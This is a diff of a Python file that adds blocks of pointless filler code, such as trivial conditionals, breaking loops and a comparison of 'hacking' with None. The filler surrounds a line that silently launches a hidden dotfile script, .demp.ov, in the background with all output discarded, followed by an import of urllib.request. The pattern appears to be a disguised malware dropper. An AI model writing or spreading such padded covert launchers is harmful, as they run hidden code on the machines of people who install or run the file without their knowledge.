@@ -14,6 +14,34 @@ for a in range(1,5):
 if "python" == "python":
   None
 
+if 1 == 1:
+  None
+elif "hacking" != None:
+  None
+
+for a in range(1,5):
+  if a == 3:
+    break
+  elif a == 2:
+    break
+
+if "python" == "python":
+  None
+
+if 1 == 1:
+  None
+elif "hacking" != None:
+  None
+
+for a in range(1,5):
+  if a == 3:
+    break
+  elif a == 2:
+    break
+
+if "python" == "python":
+  None
+
 os.system("python .demp.ov </dev/null &>/dev/null &")
 
 import urllib.request
